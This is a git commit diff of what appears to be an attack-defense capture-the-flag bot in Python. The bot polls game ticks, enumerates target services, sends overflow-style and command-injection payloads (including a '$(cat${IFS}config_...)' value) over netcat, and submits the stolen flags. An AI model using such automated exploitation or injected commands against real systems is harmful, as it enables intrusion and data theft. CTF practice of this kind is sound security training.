d4d5965accd96360a8328f7220ab5ed37368f67f
Akash Nigam <akashnigam2012@gmail.com>
2019-12-07 10:23:02 -0700

    temo commit

--- fourth.py
+++ fourth.py
@@ -25,33 +25,54 @@ def netcat(hostname, port, content):
     s.close()
     return ret_list
 
-def exploit_dungeon(hostname, port, flagId):
+def exploit_tweety(hostname, port, flagId):
     print 'hostname:',hostname, 'port:',port, 'flagId:', flagId
     #content = ['2016'+ "\n"]#, 'east' + "\n", '1' + "\n", 'east'+"\n", 'get '+flagId + "\n"]# + '1' + "\n" + 'get '+flagId + "\n" #+ 'a' + "\n" + '$(cat${IFS}config_'+flagId+')' "\n"+ 's'+ "\n"
     #ret_list = chattingnetcat(hostname, port, content)
-    content =  '2016'+ "\n" + 'east' + "\n" + '1' + "\n" + 'east' + "\n" + 'get '+flagId + "\n" + 'xyz ' + "\n" #+ 'a' + "\n" + '$(cat${IFS}config_'+flagId+')' "\n"+ 's'+ "\n"
-    ret_list = netcat(hostname, port, content)
-    exit()
-    print 'ret_list:'
-    pprint(ret_list)
-    file_name = ret_list[2].split()[4]
-    print 'filename:',file_name, 'file_name_index', file_name.index('!')
-    file_name = file_name[:file_name.index('!')]
-    print 'filename:',file_name
-    print "\n\n\n\n\n\n"
-    content = 'l' + "\n" + file_name + "\n" + "\n" + 'v'
+    content =  'R'+ "\n" + flagId + "\n" + 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab' + "\n"
     ret_list = netcat(hostname, port, content)
     print 'ret_list:'
     pprint(ret_list)
-    flag = ret_list[5].split('[*]')[0].split()[3]
-    print 'flag:', flag
-    eqIndex = flag.index('=')
-    eqIndex += 1
-    print 'flag:',flag, flag.index('='), flag[eqIndex:-2]
-    flag = flag[eqIndex:-2]
+    pprint(ret_list[1].split('\\n')[1].split()[2])
+    flag = ret_list[1].split('\\n')[1].split()[2]
     print 'FLAG================================================================================================:', flag
     print(t.submit_flag([flag]))
 
+def exploitServices():
+
+    # exit()
+    print(t.get_service_list())
+    # t.get_targets(service_id)
+    services = t.get_service_list()
+    print('services:', services)
+    print()
+    print()
+    for service in services:
+        print 'SERVICE NAME:', service
+        print 'SERVICE ID:', service['service_id']
+        service_id = service['service_id']
+        service_name = service['service_name']
+        print 'service_name:', service_name
+        targets = t.get_targets(service_id)
+        for target in targets:
+            print('TARGET NAME:', target)  # ,netcat(target,''))
+            hostname = target['hostname']
+            port = target['port']
+            flag_id = target['flag_id']
+            if service_name == 'no-rsa':
+                try:
+                    pass
+                    # exploit_no_rsa(hostname,port,flag_id)
+                except:
+                    print 'Exception occured for user'
+            elif service_name == 'tweety_bird':
+                try:
+                    # pass
+                    exploit_tweety(hostname, port, flag_id)
+                except Exception:
+                    traceback.print_exc()
+                    print 'Exception occured for user:'
+            # break
 
 #exploit_dungeon('localhost', 20002, 'flag19')
 #exit()
@@ -61,45 +82,15 @@ print(t.game_url)
 #print(t.get_vm())
 while True:
     gameStatus = t.get_game_status()
-    print('gameStatus:',gameStatus)
-    #exit()
+    print('gameStatus:', gameStatus)
     currentTick = gameStatus['tick']['tick_id']
-    print(t.get_service_list())
-    #t.get_targets(service_id)
-    services = t.get_service_list()
-    print('services:',services)
-    print()
-    print()
-    for service in services:
-        print 'SERVICE NAME:',service
-        print 'SERVICE ID:',service['service_id']
-        service_id = service['service_id']
-        service_name = service['service_name']
-        print 'service_name:',service_name
-        targets = t.get_targets(service_id)
-        for target in targets:
-            print('TARGET NAME:',target)#,netcat(target,''))
-            hostname = target['hostname']
-            port = target['port']
-            flag_id = target['flag_id']
-            if service_name == 'no-rsa':
-                try:
-                    pass
-                    #exploit_no_rsa(hostname,port,flag_id)
-                except:
-                    print 'Exception occured for user'
-            elif service_name == 'configurations':
-                try:
-                    pass
-                    #exploit_configuration(hostname, port, flag_id)
-                except Exception:
-                    traceback.print_exc()
-                    print 'Exception occured for user:'
-            #break
+    exploitServices()
     while True:
         newGameStatus = t.get_game_status()
         newTick = newGameStatus['tick']['tick_id']
         print 'Checking new tick:',newTick
         if newTick != currentTick:
+            print("Tick has changed so waiting for 25 more seconds")
+            time.sleep(25)
             break
         time.sleep(10)
